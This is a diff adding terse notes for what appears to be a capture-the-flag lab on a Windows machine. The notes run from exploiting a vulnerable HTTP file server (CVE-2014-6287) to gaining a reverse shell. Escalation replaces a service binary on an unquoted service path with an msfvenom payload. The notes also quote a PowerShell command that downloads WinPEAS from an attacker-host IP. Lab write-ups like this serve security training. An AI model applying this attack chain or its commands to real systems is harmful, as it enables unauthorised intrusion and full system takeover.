@@ -1,0 +1,28 @@
+1: Scan through nmap revealed running http service on the target machine and a server file system running on port 8080
+2: reaching http service on port 8080 through the browser revealed the specific server file system and its version
+3: server file system verson was vulnerable (CVE-2014-6287)
+
+
+4: looking for an exploit with metasploit
+5: machine exploited succesfully using meterpreter payload and gained access as Bill user on the target. 
+6: using a tool called PowerUp.ps1 showed some vulnerabilities including unquoted service path and canRestart option set to true for AdvancedSystemCareService9 pointing to a file called ASCService.exe running as LocalSystem 
+7: Downloaded the original ASCService.exe file from the target machine to use it as a templete for msfvenom payload thanks to flag -x and -k.
+8: AdvancedSystemCareService9 stopped
+9: uploaded the modified executable on the target machine
+10: opened netcat server on attacker machine
+11: started service on target machine
+12: gained localsystem shell on attacker machine
+13: flags retrived
+
+
+4: looking for an exploit on exploit-db
+5: setting up http server and nc server on the attacker machine as decleared on exploit's instructions
+6: exploit code converted from python2 to python3. code modified due the specific attacker machine enviroment: http attacker server was running on port 9000 instead of default 80.
+7: nc.exe binary was downloaded on the attacker machine because used by the exploit to uploading it on the target machine.
+: target machine exploited succesfully and reverse shell gained
+: winPEAS privesc file downloaded through powershell -c command: powershell -c "Invoke-WebRequest http://192.168.144.90:9000/WinPEAS.ps1 -OutFile winPEAS.ps1"
+: winPEAS revealed AdvancedSystemCareService9 as vulnerable due to "unquoted service path" running as LocalSystem user: C:\Program Files (x86)\IOBit\Advanced SystemCare\ASCService.exe
+: payload created using msfvenom as normal exe file under the name of Advanced.exe 
+: payload uploaded through powershell -c command
+: starting AdvancedSystemCareService9
+: reverse shell as superuser obtained on a new netcat server on attacker machine
